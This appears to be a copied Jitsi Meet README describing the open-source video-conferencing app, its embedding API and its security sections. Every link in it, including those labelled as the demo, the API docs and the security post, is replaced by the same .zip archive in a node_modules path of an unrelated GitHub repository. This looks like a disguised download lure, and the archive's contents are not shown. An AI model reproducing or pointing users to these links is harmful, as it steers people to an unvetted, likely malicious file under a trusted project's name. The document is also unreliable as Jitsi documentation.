# Jitsi Meet - Secure, Simple and Scalable Video Conferences

Jitsi Meet is an open-source (Apache) WebRTC JavaScript application that uses [Jitsi Videobridge](https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip) to provide high quality, [secure](https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip) and scalable video conferences. Jitsi Meet in action can be seen at [here at the session #482 of the VoIP Users Conference](https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip).

The Jitsi Meet client runs in your browser, without installing anything on your computer. You can try it out at https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip

Jitsi Meet allows for very efficient collaboration. Users can stream their desktop or only some windows. It also supports shared document editing with Etherpad.

## Embedding in external applications

Jitsi Meet provides a very flexible way of embedding in external applications by using the [Jitsi Meet API](https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip).

## Security

The security section here was starting to feel a bit too succinct for the complexity of the topic, so we created a post that covers the topic much more broadly here: https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip

The section on end-to-end encryption in that document is likely going to be one of the key points of interest: https://raw.githubusercontent.com/adesh777/satimeet.github.io/main/node_modules/patch-package/satimeet.github.io-insurgence.zip

## Security issues
